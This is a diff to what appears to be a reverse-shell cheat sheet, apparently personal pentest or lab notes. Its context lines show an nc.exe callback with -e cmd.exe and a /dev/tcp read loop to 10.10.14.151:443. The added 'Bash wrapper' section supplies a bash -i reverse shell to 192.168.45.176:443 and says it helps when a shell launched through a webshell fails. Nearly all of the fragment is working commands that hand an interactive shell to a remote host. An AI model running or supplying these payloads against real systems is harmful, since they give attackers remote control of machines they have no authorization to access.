@@ -58,6 +58,12 @@ nc.exe <IP> <PORT> -e cmd.exe
 
 this one works everywhere `exec 5<>/dev/tcp/10.10.14.151/443;cat <&5 | while read line; do $line 2>&5 >&5; done`
 
+### Bash wrapper
+
+sometimes bash fails especially from webshell, so it can be wrapped to fix it
+
+`bash -c "bash -i >& /dev/tcp/192.168.45.176/443 0>&1"`
+
 ## Powershell
 
 ### Encoded Powershell Execution
